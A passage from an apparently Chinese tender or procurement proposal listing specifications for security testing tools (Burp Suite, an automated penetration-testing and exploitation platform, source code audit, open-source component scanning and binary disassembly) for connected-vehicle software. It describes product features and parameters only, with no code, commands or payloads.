支持测试目标网站是否容易受到点击劫持攻击。参数包括框架检测策略、劫持技术选择、以及用户交互模拟。</p><p>代理流量分析：提供通过代理的所有请求和响应的详细信息，包括HTTP头部、会话数据、以及变化跟踪。参数包括数据过滤选项、高亮显示设置、以及流量记录级别。</p><h3 id="产品白皮书"><a href="#产品白皮书" class="headerlink" title="产品白皮书"></a>产品白皮书</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/46bfe2c52328c83ec2ef142d8ed9111d.jpeg" alt="Burp Suite_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/183f25940f140ee5cac4289e154026e7.jpeg" alt="Burp Suite_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b8e06ac2e45b58b55c3e106966ec2af0.jpeg" alt="Burp Suite_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e36f5ff62fcb3e72092e0eb8f4d4501f.jpeg" alt="Burp Suite_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/21f5863cb60ff1b4599f396b0d5d27f7.jpeg" alt="Burp Suite_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9da64ae454a33302f01297e1cd6c8d9a.jpeg" alt="Burp Suite_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ff765cebe103d59fd7fd961f77639931.jpeg" alt="Burp Suite_06"></p><h3 id="工具参数-19"><a href="#工具参数-19" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该工具信息如下：</p><p>品牌：PortSwigger Web Security</p><p>型号：Burp Suite</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持SQL注入、跨站脚本XSS等100项通用漏洞；</li><li>支持Web应用程序爬虫，对JavaScript的静态分析和动态分析；</li><li>支持检测服务器端漏洞；</li><li>支持检测目标应用程序，在到达应用程序中的危险API时提供反馈；</li><li>支持内容发现功能，可用于发现浏览内容链接的隐藏内容和功能；</li><li>支持显示静态和动态URL的数量 ，以及每个URL占用的参数数量；</li><li>支持匹配和替换规则自动对通过代理的请求和响应应用自定义修改；</li><li>支持伪造代理证书；</li><li>支持使用标准的随机性加密测试对会话令牌进行统计分析；</li><li>支持点击劫持攻击；</li><li>支持通过代理的所有请求和响应的完整详细信息展示；</li><li>支持软件license和数据库三年之内免费升级。产品白皮书见“产品白皮书”部分。</li></ol><h2 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h2><h3 id="工具概述-20"><a href="#工具概述-20" class="headerlink" title="工具概述"></a>工具概述</h3><p>安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。可为渗透测试全过程提供专业的技术支持：</p><p>渗透前期：提供信息收集能力，包括：子域名发现、目录扫描、指纹识别、邮箱收集、敏感信息泄露收集等功能；</p><p>渗透中期：提供针对目标的漏洞发现和利用功能和社会工程学攻击功能；</p><p>渗透后期：提供进入内网之后的横向渗透等功能。</p><h3 id="工具方案-20"><a href="#工具方案-20" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-20"><a href="#软件方案-20" class="headerlink" title="软件方案"></a>软件方案</h4><p>中央管理服务器：负责用户管理、任务管理和结果收集等功能。提供Web界面和命令行接口供用户操作。</p><p>多用户支持与操作界面：工具将支持多用户操作，满足不同用户的需求：Web界面：为一般用户提供图形化操作界面，简化渗透测试的复杂性。命令行界面：为高级用户提供命令行工具，以便于执行更复杂的定制化操作。</p><p>任务调度：允许用户设置定时任务，以自动执行渗透测试。</p><p>结果报告：提供详细的测试报告，包括漏洞详情、利用过程和测试结果。</p><p>模块更新：支持在线更新漏洞利用模块，以便及时响应新出现的漏洞。</p><p>用户管理：允许管理员对用户权限进行管理，确保测试工作的安全性和有效性。</p><h4 id="工具功能-20"><a href="#工具功能-20" class="headerlink" title="工具功能"></a>工具功能</h4><p>信息收集评估：自动化收集目标系统的网络信息、服务信息、操作系统详情等。</p><p>漏洞扫描评估：快速识别目标系统的已知漏洞，使用数据库中的漏洞签名进行匹配。</p><p>漏洞利用测试：针对扫描到的漏洞，自动尝试多种利用技术，以实现对系统的渗透。</p><p>权限提升测试：在渗透成功后，自动尝试多种方法提升权限，获取更深层次的系统访问能力。</p><p>证据收集：自动化搜集系统漏洞利用后的证据，如系统用户信息、敏感文件等。</p><p>多用户支持与操作界面：工具支持多用户操作，满足不同用户的需求：Web界面：为一般用户提供图形化操作界面，简化渗透测试的复杂性。命令行界面：为高级用户提供命令行工具，以便于执行更复杂的定制化操作。</p><p>漏洞攻击利用模块：工具将集成超过1600个漏洞利用模块，涵盖各种操作系统、应用程序和网络设备的已知漏洞，确保能够对最新的安全威胁做出响应。</p><p>横向扩展能力：工具支持通过代理和VPN进行跳板式攻击，使得用户可以利用已经渗透的机器作为跳板，进一步攻击同一网络中的其他目标。</p><p>多环境部署支持：工具支持在虚拟化环境、便携式笔记本以及硬件服务器上部署，确保渗透测试工作可以在各种条件下顺利进行。</p><h3 id="产品彩页-27"><a href="#产品彩页-27" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2f017580addd964d357b2f71560b1322.png"></p><h3 id="工具参数-20"><a href="#工具参数-20" class="headerlink" title="工具参数"></a>工具参数</h3><ol><li>支持自动进行深度安全测试评估（渗透测试），对渗透测试的信息收集、漏洞扫描、漏洞利用、权限提升、证据收集等步骤能均能实现自动化处理；</li><li>支持多用户，一般用户通过Web界面操作，也支持高级用户使用命令行操作；</li><li>漏洞攻击利用模块等于1600个；</li><li>支持横向扩展，支持代理跳板及VPN跳板式攻击，利用一台渗透成功机器作为跳板渗透同网段其它主机或设备；</li><li>支持虚拟机部署方式，便于在各种环境下使用。</li><li>支持软件license和数据库三年之内免费升级。</li></ol><h2 id="源代码安全审计工具"><a href="#源代码安全审计工具" class="headerlink" title="源代码安全审计工具"></a>源代码安全审计工具</h2><h3 id="工具概述-21"><a href="#工具概述-21" class="headerlink" title="工具概述"></a>工具概述</h3><p>为解决智能网联汽车软件功能在源代码安全检测方面遇到的问题，提供了一套企业级源代码缺陷分析、源代码缺陷审计、源代码缺陷修复跟踪的解决方案。</p><h3 id="工具方案-21"><a href="#工具方案-21" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-21"><a href="#软件方案-21" class="headerlink" title="软件方案"></a>软件方案</h4><p>1. 仪表盘</p><p>任务概览：显示当前活跃、成功和失败的检测任务数量。</p><p>项目快速访问：为用户提供关注的项目列表和状态概要。</p><p>趋势分析图表：图形化展示缺陷趋势和检测统计。</p><p>2. 任务管理</p><p>任务列表：以表格形式列出所有任务，包含状态标识。</p><p>任务创建：提供创建新任务的表单，包括配置任务参数。</p><p>任务搜索与过滤：根据任务名、语言、状态等进行搜索。</p><p>任务操作：允许用户重新检测、删除和查看任务详情。</p><p>3. 项目管理</p><p>项目列表：展示所有项目及其相关信息。</p><p>项目创建与配置：提供创建和配置项目的界面。</p><p>项目搜索与过滤：根据项目名、创建者等进行搜索。</p><p>项目状态管理：允许用户关注、禁用和删除项目。</p><p>4. 代码库集成</p><p>集成配置：设置和管理代码库连接，包括认证信息。</p><p>代码拉取：提供从不同代码库拉取代码的选项。</p><p>代码版本信息：展示拉取的代码的版本详情，如CommitID。</p><p>5. 检测配置</p><p>语言选择：允许用户选择需要检测的编程语言。</p><p>规则集选择：用户可以选择MISRA C等规则集。</p><p>例外设置：配置不参与检测的文件或文件夹。</p><p>6. 审计结果</p><p>结果概览：提供任务的检测概要，包括问题分类统计。</p><p>缺陷列表：显示所有检测到的缺陷，并支持排序和筛选。</p><p>缺陷详情：展示缺陷的详细信息，修复建议和跟踪路径。</p><p>结果通知设置：配置结果通知的接收人和邮件模板。</p><p>7. 缺陷管理</p><p>缺陷搜索：按名称、分类、文件等进行缺陷搜索。</p><p>缺陷跟踪：提供缺陷的跟踪路径图和表。</p><p>批量操作：批量提交缺陷到第三方Bug系统。</p><p>8. 报告与统计</p><p>趋势分析：动态图表显示缺陷趋势和检测效率。</p><p>报告生成：生成和下载详细的审计报告。</p><p>统计数据：提供各种维度的统计数据，如语言行数统计。</p><p>9. 设置与配置</p><p>用户权限管理：设置不同用户和部门的访问权限。</p><p>安全标准配置：选择和配置不同的安全标准。</p><p>通知配置：设定检测完成后的通知方式和内容。</p><p>10. 帮助与支持</p><p>文档中心：提供详细的用户手册和使用指南。</p><p>FAQ：常见问题解答。</p><p>技术支持：联系方式和提交技术支持请求的表单。</p><h4 id="工具功能-21"><a href="#工具功能-21" class="headerlink" title="工具功能"></a>工具功能</h4><p>多语言支持：工具支持广泛的编程语言，包括但不限于C/C++、Objective-C、Swift、C#、Java、PHP、Python、COBOL、NodeJS、SQL、GO、Kotlin、Ruby、Scala、XML、Yaml、JavaScript、JSP、HTML、VM、Config、ASP.NET、Shell。此外，工具将包括对MISRA C 2012规则的检测，确保对嵌入式系统代码的高标准审计。</p><p>检测任务列表：所有检测任务将以列表形式展示，清晰显示正在检测中、检测成功、检测失败的任务，以便用户实时监控审计进度。</p><p>高级搜索功能：用户可以通过任务名、检测语言、检测状态、检测时间等维度进行高级搜索，快速找到特定的检测任务。</p><p>任务发起与配置：用户可轻松发起检测任务，并配置任务名、检测语言、检测源码等关键信息。</p><p>代码库集成：工具将支持从远程代码库获取检测代码，兼容Git、SVN、Azure DevOps（TFS）、ClearCase、StartTeam、共享目录、FTP等多种版本控制系统，包括支持通过分支、tags、commitID进行代码拉取。</p><p>例外配置：用户可配置例外文件或文件夹，这些文件将仅参与编译过程，不参与安全检测，以减少不必要的审计工作量。</p><p>重新检测：支持对检测失败的任务重新发起检测，确保每项任务都能获得审计结果。</p><p>任务删除与清理：用户能够删除选中的检测任务，并自动清理相关的结果文件，保持工作环境的整洁。</p><p>结果通知：检测完成后，工具将自动将结果通过电子邮件通知给代码的相关人员（创建者和访问者），确保及时反馈。</p><p>项目整合管理：支持将多个工程（源码）组合到一个项目中，实现整合管理、持续检测、数据统计和趋势分析，以适应实际项目的复杂情况。</p><p>项目列表展示：以列表形式展示所有项目，方便用户管理和访问。</p><p>项目高级搜索：用户可以通过项目名、创建者、检测语言、创建时间等维度进行项目的高级搜索。</p><p>项目创建与配置：用户可以创建项目并配置项目名、检测语言、检测源码等信息。</p><p>代码库集成（项目级别）：与任务级别相同，支持从远程代码库获取检测代码。</p><p>权限管理：支持将任务查看权限授予个人或部门，确保信息的安全性和适当的访问控制。</p><p>路径剪裁与误报降低：当某个缺陷已经被修复函数解决时，用户可以通过设置函数白名单进行自动化路径剪裁，减少误报。</p><p>检测批次概览：用户可以查看每个检测批次的详细检测情况。</p><p>检测差距分析：支持查看某检测批次与检测目标的差距，帮助用户识别关键缺失。</p><p>缺陷趋势分析：支持查看每个批次的缺陷变化趋势，用于评估安全改进措施的效果。</p><p>项目关注：用户可以关注特定项目，进行快捷查看，以便快速访问常用项目。</p><p>项目禁用：支持禁用项目，禁用的项目仅可查看检测数据，不可发起新的检测任务。</p><p>任务检测概要展示：展示任务基本信息、源代码信息、各语言源码行数统计、问题分类统计等检测概要。</p><p>代码仓库信息记录：记录并展示检测代码仓库地址、分支/tags、CommitID、代码提交者等信息。</p><p>依赖库查看：支持查看该检测任务的依赖库，以了解代码的外部依赖。</p><p>编译日志查看：支持查看该检测任务的编译日志，帮助诊断编译过程中的问题。</p><p>缺陷合并展示：对文件路径相同、爆发行相同的缺陷进行合并展示，提高问题查看的效率。</p><p>全文检索：支持对整个代码区的内容进行全文检索，包括但不限于函数名称等关键信息。</p><p>缺陷跟踪路径：提供同一分类跟踪路径图、单个缺陷跟踪路径表和图，以便用户了解缺陷产生的上下文和最佳修复点。</p><p>修复建议：对于检测出的问题，工具将提供修复建议，帮助开发者快速解决问题。</p><p>安全标准兼容：支持CERT、CWE、CWE/SANS TOP 25、GB/T 34943-2017 C/C++、GB/T 34944-2017 Java、GB/T 34946-2017 C#、GJB 5369-2005、GJB 8114-2013、ISO/IEC TR 24772、OWASP Mobile Top 10、OWASP TOP 10、PCI DSS、SJ/T 11682-2017、SJ/T 11683-2017等多种安全标准，确保代码审计能够满足国内外的安全要求。</p><p>缺陷搜索：支持根据缺陷的名称、分类、审计状态、所在文件、爆发行提交作者进行搜索，以便用户快速定位特定问题。</p><p>缺陷管理与集成：支持将缺陷按照分类、等级等维度筛选，批量提交到已配置的第三方Bug系统中，实现缺陷管理的自动化和集成。</p><h3 id="产品彩页-28"><a href="#产品彩页-28" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0f07e767393f87e19543d6e705ced788.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/537de2f4979f2406f20dfb81caecc540.png"></p><h3 id="工具参数-21"><a href="#工具参数-21" class="headerlink" title="工具参数"></a>工具参数</h3><ol><li>支持C/C++、Objective-C、Swift、C#、Java、PHP、Python、COBOL、NodeJS、SQL、GO、Kotlin、Ruby、Scala、 XML、Yaml、JavaScript、JSP、HTML、VM、Config、ASP.NET、Shell，MISRA C规则检测（至少包括2012版本）；</li><li>以列表形式显示所有检测任务，包括正在检测和检测成功、检测失败的任务；</li><li>支持以任务名、检测语言、检测状态、检测时间等维度为条件进行快速检测的高级搜索；</li><li>支持发起任务并配置任务名、检测语言、检测源码等信息；</li><li>支持从远程代码库获取检测代码，包括：Git（支持通过分支/tags/commitID进行代码拉取）、SVN、Azure DevOps（TFS）、ClearCase、StartTeam、共享目录、FTP等；</li><li>配置的例外文件/文件夹仅参与编译，不参与检测；</li><li>支持对检测失败的任务，重新发起检测；</li><li>支持删除所选检测任务，同时清理结果文件；</li><li>支持检测完成后将检测结果以邮件方式通知到代码相关人（创建者和访问者）；</li><li>支持根据实际项目情况将多个工程（源码）组合到一个项目中进行整合管理、持续检测、数据统计和趋势分析</li><li>支持以列表形式显示所有项目；</li><li>支持以项目名、创建者、检测语言、创建时间等维度为条件进行项目的高级搜索；</li><li>支持创建项目并配置项目名、检测语言、检测源码等信息；</li><li>支持从远程代码库获取检测代码，包括：Git（支持通过分支/tags/commitID进行代码拉取）、SVN、Azure DevOps（TFS）、ClearCase、StartTeam、共享目录、FTP等；</li><li>支持将任务查看权限授予个人或部门；</li><li>支持当某个缺陷已经被额外写的某个函数修复时，可以通过设置函数白名单对该缺陷进行自动化路径剪裁，降低误报；</li><li>支持查看每个检测批次下的检测情况</li><li>支持查看某检测批次与检测目标的差距</li><li>支持查看每个批次的缺陷变化趋势</li><li>支持关注某项目进行快捷查看</li><li>支持禁用项目，禁用的项目仅可查看检测数据不可发起检测任务</li><li>展示任务检测概要，包含任务基本信息、源代码信息、各语言源码行数统计、问题分类统计</li><li>如本次检测是从远程代码仓库获取，可以记录并展示检测代码仓库地址、分支/tags、CommitID、代码提交者等信息</li><li>支持查看该检测任务的依赖库</li><li>支持查看该检测任务的编译日志</li><li>支持对文件路径相同、爆发行相同的缺陷进行合并展示</li><li>支持对整个代码区的内容进行全文检索，包括但不限于函数名称等</li><li>支持同一分类跟踪路径图（可查看最佳修复点）、单个缺陷跟踪路径表、单个缺陷跟踪路径图</li><li>支持显示该问题的修复建议</li><li>支持CERT、CWE、CWE/SANS TOP 25、GB/T 34943-2017 C/C++、GB/T 34944-2017 Java、GB/T 34946-2017 C#、GJB 5369-2005、GJB 8114-2013、ISO/IEC TR 24772、OWASP Mobile Top 10、OWASP TOP 10、PCI DSS、SJ/T 11682-2017、SJ/T 11683-2017</li><li>支持根据缺陷的名称、分类、审计状态、所在文件、爆发行提交作者进行搜索</li><li>支持将缺陷按照分类、等级等维度筛选，批量提交到已配置的第三方Bug系统中</li><li>支持软件license和数据库三年之内免费升级。</li></ol><h2 id="开源组件检查工具"><a href="#开源组件检查工具" class="headerlink" title="开源组件检查工具"></a>开源组件检查工具</h2><h3 id="工具概述-22"><a href="#工具概述-22" class="headerlink" title="工具概述"></a>工具概述</h3><p>搭建开源组件安全分析平台，对应用系统的源代码及私服仓库进行开源组件成分分析，识别出企业全部在用的开源组件资产和漏洞清单。</p><h3 id="工具方案-22"><a href="#工具方案-22" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-22"><a href="#软件方案-22" class="headerlink" title="软件方案"></a>软件方案</h4><p>1.用户管理：用户注册/登录/注销；用户权限分配与管理；用户操作记录与审计；用户个人信息管理；多用户协作支持。</p><p>2.项目管理：新建/导入项目；项目列表与状态查看；项目相关设置（如定时检测配置）；项目成员管理与权限分配；项目历史记录与版本控制。</p><p>3.检测任务：创建和配置检测任务；支持上传本地代码压缩包；远程仓库连接配置与检测；检测任务的进度监控；批量检测任务管理。</p><p>4.组件分析：开源组件依赖树展示；组件详细信息查看（名称、版本、危害等级等）；组件在项目中的位置定位；组件版本管理与建议更新；组件完整性校验。</p><p>5.安全与合规：漏洞检测与分析；安全漏洞数据库集成与更新；漏洞告警与提醒；安全规则自定义与管理；许可协议分析与风险评估。</p><p>6.审计与报告：审计日志记录与查看；源组件使用审计；漏洞与许可协议报告生成；报告自定义与导出（支持多种格式）；批量报告下载。</p><p>7.搜索与检索：组件、漏洞、许可协议的全局搜索；高级检索（按漏洞编号、等级等）；搜索结果的过滤与排序；搜索历史记录与快速重复搜索。</p><p>8.知识库与数据更新：本地化知识库的浏览与检索；知识库的定期自动或手动更新；知识库更新历史记录与版本管理；离线更新包的导入与应用。</p><p>9.系统设置与维护：系统基本设置（语言、主题等）；系统维护工具（备份、恢复等）；系统状态监控与日志。</p><h4 id="工具功能-22"><a href="#工具功能-22" class="headerlink" title="工具功能"></a>工具功能</h4><p>检测对象支持：支持本地源代码的检测，包括zip、rar、tar.gz等压缩包格式，确保用户可以轻松上传和检测本地代码库。支持远程代码仓库的检测，包括Git、SVN、FireFly等，用户可以通过提供仓库链接和认证信息来启动检测过程。定时检测功能允许用户设定周期性检测，以确保代码库的持续合规性和安全性。支持对jar包、War包、二进制文件等的开源组件分析，提供全面的检测能力。</p><p>系统架构与用户支持：采用B/S架构设计，用户无需安装客户端软件，可通过浏览器直接使用系统。支持多用户登录和操作，满足团队协作的需求。支持多任务并发检测，提高系统的工作效率。</p><p>编程语言支持：支持包括Java、Python、JavaScript、.NET、PHP、Swift/OC、Go/Golang、Erlang、Scala、Ruby、Perl、R、Groovy、Kotlin、Clojure、RUST等在内的主流编程语言的开源组件识别。</p><p>开源项目与版本支持：系统内置的开源项目数据库包含不少于400万个项目，版本数量不少于4000万，覆盖广泛的开源生态。</p><p>详细信息分析：能够分析并展示被测对象所使用的开源组件的详细信息，包括但不限于组件名称、版本、危害等级、更新日期、许可协议、漏洞分布和漏洞利用难度等。</p><p>组件依赖分析：支持组件依赖分析，可识别直接和间接依赖，为用户提供组件的依赖树视图。定位组件在项目中的具体引用位置，方便开发者快速定位和处理问题。</p><p>开源组件统一管理：提供强大的组件管理功能，用户可以查看、罗列和导出检测项目中的所有开源组件资产。提供组件与项目的关联关系，帮助用户理解各组件在项目中的作用。</p><p>组件审计功能：提供组件审计功能，用户可以对检测出的开源组件进行确认和标注，以便于追踪和管理。</p><p>版本管理与建议：提供开源组件的最新发布版本信息，以及与当前版本差异最小的无漏洞版本推荐。提供其他无漏洞的可用版本，帮助用户选择最合适的组件版本。</p><p>完整性校验：对引入的jar包进行完整性校验，确保其内容未被篡改，保障代码安全。</p><p>批量检测支持：支持对代码仓库进行批量检测，提高大型项目的检测效率。</p><p>组件安全性查：支持基于开源组件坐标的精确查验，以及关键字的模糊匹配，用户可通过这两种方式进行全局检索。</p><p>安全管控规则自定义：允许用户自定义安全管控规则，如禁止或允许使用特定的组件，并在检测结果中提供明确的结果标识和管控日志。</p><p>漏洞库兼容性：支持CNNVD、NVD等权威漏洞库，以及开源社区的漏洞情报，确保漏洞信息的全面性和时效性。</p><p>漏洞详细信息提供：提供漏洞的详细信息，包括漏洞名称、CVE编号、CNNVD编号、发布日期、更新日期、厂商信息、漏洞类型、描述、等级、攻击类型、来源、利用难度、解决方案、参考链接等。</p><p>漏洞清单导出：支持导出漏洞清单，方便用户进行进一步的分析和记录。</p><p>漏洞检索功能：支持按照漏洞编号、等级、检测项目、时间等条件进行漏洞的高级检索。</p><p>许可协议关联分析：系统能够关联分析开源组件使用的许可协议和该协议的风险等级，帮助用户理解法律风险。</p><p>许可协议详细信息：提供许可协议的详细信息，包括协议简称、全称、内容、授权明细、标题、等级、文本、影响的组件和项目等。</p><p>许可协议清单导出：支持导出许可协议清单，包含协议名称、等级、影响的项目等信息。</p><p>协议检索功能：支持根据协议名称、风险等级、检测项目进行协议检索。</p><p>漏洞提醒和告警：当新的漏洞影响到系统中的开源组件时，系统将自动关联项目信息，并进行漏洞提醒和告警。</p><p>检测结果导出功能：支持检测结果的导出，报告内容包括组件信息、漏洞信息、来源、建议版本等。支持Word、Excel、PDF格式，且支持批量下载。</p><p>本地化知识库支持：提供全量的本地化知识库，包括开源项目信息、版本信息、开源协议、漏洞库信息。</p><p>知识库离线更新：定期提供知识库的离线更新包，用户可通过系统后台界面离线导入，确保信息的最新性。</p><h3 id="产品彩页-29"><a href="#产品彩页-29" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1a842db41d185d1aeb4293c1515471ce.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4909706a8ca2ca5c543a1ca4f7376717.png"></p><h3 id="工具参数-22"><a href="#工具参数-22" class="headerlink" title="工具参数"></a>工具参数</h3><ol><li>检测对象支持本地源代码(zip压缩包、rar压缩包、tar.gz压缩包)、代码仓库（Git、SVN、FireFly），对于代码仓库支持定时检测，支持jar包、War包、二进制文件进行开源组件分析</li><li>基于B/S架构，支持多用户使用系统，支持多任务并发检测</li><li>支持对Java、Python、JavaScript、.NET、PHP、Swift/OC、Go/Golang、.Net、Erlang、Scala、Ruby、Perl、R、Grovvy、kotlin、Clojure、RUST等主流编程语言的开源组件识别</li><li>支持开源项目数量应不少于400万， 开源项目版本数量应不少于4000万</li><li>支持分析出被测对象所使用的开源组件的详细信息，包括组件名称、版本、组件危害等级（超危、高危、中危、低危等）、更新日期、许可协议、漏洞分布、漏洞利用难度等,</li><li>支持组件依赖分析，能够识别并标明直接来源和间接来源及数量，定位组件在项目的引用位置</li><li>支持开源组件的统一管理，能够罗列、导出已检测项目的全部开源组件资产清单，并提供组件和项目的关联关系</li><li>支持组件审计功能，可审计系统检测出的开源组件确认情况（遗留、不是问题）</li><li>支持提供开源组件的最新发布版本、与当前版本差异最小的无漏洞版本、其他无漏洞的可用版本;</li><li>支持对引入的jar包进行完整性校验，校验其是否被篡改</li><li>支持对代码仓库（如GitLab、Gitee）批量检测</li><li>支持组件安全性查验功能，可根据开源组件坐标精确查验和关键字模糊匹配两种方式进行全局检索开源组件的漏洞、等级、许可协议信息</li><li>支持自定义安全管控规则(如：禁止使用、允许使用)，检测结果中提供结果标识和管控日志</li><li>支持分析开源组件所关联的漏洞，漏洞库兼容CNNVD、NVD等权威漏洞库以及开源社区（未被权威漏洞库收录）漏洞情报</li><li>支持提供漏洞详细信息，包含漏洞名称、漏洞CVE编号、CNNVD编号、发布日期及最新的更新日期、厂商信息、漏洞类型、漏洞描述、漏洞等级（包括超危、高危、中危、低危等）、攻击类型、漏洞来源、漏洞利用难度、解决方案、参考链接等</li><li>支持导出已检测的开源组件漏洞清单，漏洞清单信息包含漏洞编号、漏洞名称、利用难度、影响的项目、发布日期等</li><li>支持按照漏洞编号（CVE编号、CNNVD编号）、漏洞等级、检测项目、时间进行漏洞检索</li><li>支持组件许可协议关联分析，系统能够关联并分析开源组件使用的许可协议以及该许可协议的风险等级</li><li>支持提供许可协议的详细信息，包括协议简称、协议全称、协议内容、协议授权明细（包含允许使用、条件使用、禁止使用的条款）、标准标题、协议等级、协议文本、影响组件及项目等</li><li>支持导出已检测的许可协议清单，协议清单信息包含协议简称、协议全称、协议等级、影响的项目信息</li><li>支持按照协议名称、协议风险等级、检测项目进行协议检索</li><li>当有新的漏洞影响系统中的开源组件时，系统自动关联开源组件对应的项目信息，并进行漏洞提醒和告警</li><li>支持开源组件的检测结果导出功能，报告内容包括开源组件信息、漏洞信息、组件来源、建议版本等。导出格式支持Word、Excel、PDF，导出的检测报告支持批量下载</li><li>支持全量的本地化知识库，包括开源项目信息、版本信息、开源协议、漏洞库信息</li><li>支持定期提供知识库离线更新包,更新包可通过系统后台管理界面离线导入</li><li>支持软件license和数据库三年之内免费升级。</li></ol><h2 id="二进制反汇编工具"><a href="#二进制反汇编工具" class="headerlink" title="二进制反汇编工具"></a>二进制反汇编工具</h2><h3 id="工具概述-23"><a href="#工具概述-23" class="headerlink" title="工具概述"></a>工具概述</h3><p>通过利用可执行的机器代码即二进制来分析应用程序的控制结构和运行方式,有助于信息安全从业人员更好地分析各种漏洞、病毒以及恶意软件,从而找到相应的解决方案。</p><h3 id="工具方案-23"><a href="#工具方案-23" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-23"><a href="#软件方案-23" class="headerlink" title="软件方案"></a>软件方案</h4><p>该二进制分析工具将采用模块化设计，由多个功能模块组成，以支持各种架构的二进制文件和不同操作系统。以下是软件方案设计的主要组成部分：</p><p>架构支持模块：</p><p>实现对50多种架构的二进制文件的解析和处理功能，包括64位文件的支持。</p><p>操作系统支持模块：</p><p>提供对Windows、Linux、Mac和嵌入式系统的支持，以便在不同平台上运行和使用该工具。</p><p>调试器支持模块：</p><p>集成WinDbg和Symbian调试器，以便对相应平台上的二进制文件进行调试操作。</p><p>连接模块：</p><p>支持使用debugserver协议与设备建立连接，以便在嵌入式系统上进行调试和分析。</p><p>反汇编模块：</p><p>提供交互式、可编程的多处理器反汇编功能，以解析和分析二进制文件的指令集。</p><p>文件系统模块：</p><p>支持FAT文件系统，以便在分析过程中访问和处理文件。</p><p>交互性模块：</p><p>提供交互式操作界面，使用户能够对代码进行重构、重命名和添加注释等操作。</p><p>图形化模块：</p><p>提供图形化界面，支持生成控制流图（CFG）和调用图（Callgraphs），以帮助用户可视化代码的执行路径和函数调用关系。</p><p>离线工作模块：</p><p>支持在没有互联网连接的情况下正常工作，以确保工具的稳定性和可靠性。</p><p>前端客户端模块：</p><p>支持执行第三方前端客户端，以扩展工具的功能和适应不同用户需求。</p><h4 id="工具功能-23"><a href="#工具功能-23" class="headerlink" title="工具功能"></a>工具功能</h4><p>1. 多架构支持</p><p>产品将支持超过50种不同的架构的二进制文件，包括但不限于x64、ARM64、PowerPC、MIPS等。对于64位文件，工具将能够无缝地处理，确保用户可以反汇编最新的应用程序和操作系统组件。</p><p>2. 跨平台操作系统支持</p><p>该工具将能够在Windows、Linux和Mac操作系统上运行，为用户提供了广泛的灵活性。无论用户的开发环境如何，他们都可以使用这个工具来进行他们的逆向工程任务。</p><p>3. CPU指令集反编译</p><p>工具将支持数十种CPU指令集的反编译，这意味着它能够理解和转换各种处理器的机器代码，包括高级SIMD指令和专用处理器指令。这确保了工具在面对各种硬件时的适应性和准确性。</p><p>4. 调试器集成</p><p>集成WinDbg和Symbian调试器，以及支持使用debugserver协议与设备建立连接，这将允许开发者进行深入的调试会话，并更好地理解正在运行的代码。</p><p>5. 交互式多处理器反汇编器</p><p>交互式、可编程的多处理器反汇编器将允许用户同时处理多个处理器架构，并且能够通过编程方式控制反汇编过程。</p><p>6. 文件系统和交互性支持</p><p>对FAT文件系统的支持确保了与广泛使用的存储介质的兼容性。同时，交互性功能如重构、重命名和添加注释将使用户能够更好地理解和修改代码。</p><p>7. 图形化功能</p><p>图形化功能，如控制流图（CFG）和调用图（Callgraphs），将帮助用户可视化代码的结构和流程，这对于复杂代码的理解至关重要。</p><p>8. 多工件和扩展支持</p><p>支持同一项目中的多个工件，以及通过Python脚本和其他插件进行扩展，这将使工具非常灵活，能够适应各种工作流程和需求。</p><p>9. 离线功能和第三方前端</p><p>工具将能够在没有互联网连接的情况下正常工作，这对于安全敏感的环境非常重要。同时，支持第三方前端客户端的执行，为用户提供了更多的选择和定制能力。</p><p>10. 调试器支持</p><p>广泛的调试器支持，包括对Intel x86、x86-64、ARM、ARM64和MIPS调试器的支持，确保了不同平台上的调试能力。</p><p>11. 固件代码逆向测试工具</p><p>固件代码逆向测试工具将具备良好的交互性和可编程性，支持多处理器和跨平台主机，能够处理包括但不限于Intel x86、x64、MIPS、PowerPC等指令集。</p><p>12. 二进制分析和逆向工具</p><p>该工具将具备二进制搜索、动态调试和流程图功能，能够支持瑞萨RH850指令集，以及扫描目标文件的常见文件签名和指定字符序列。</p><p>13. 文件处理和扫描</p><p>工具将支持自动提取已知的文件类型，提取文件/文件夹到自定义目录，并提供对提取文件大小和数量的限制。此外，它还将支持扫描原始deflate和LZMA压缩流，以及基于正则表达式的文件扫描和过滤功能。</p><p>14. 状态服务器和反编译器</p><p>提供状态服务器功能，并支持Dalvik、ARM、ARM64、MIPS、Intel x86和x86-64反编译器，确保了在处理各种文件和应用程序时的灵活性。</p><p>15. 文件格式支持</p><p>广泛的文件格式支持，包括存档文件、证书文件、Android APK、Windows PE/PE64/COFF、Linux ELF/ELF64、Mach-O、英特尔HEX等，确保了与各种应用程序和系统的兼容性。</p><p>16. 特定平台支持</p><p>对特定平台的支持，如Dalvik调试器（Android），以及对libravm/Move模块的Libra 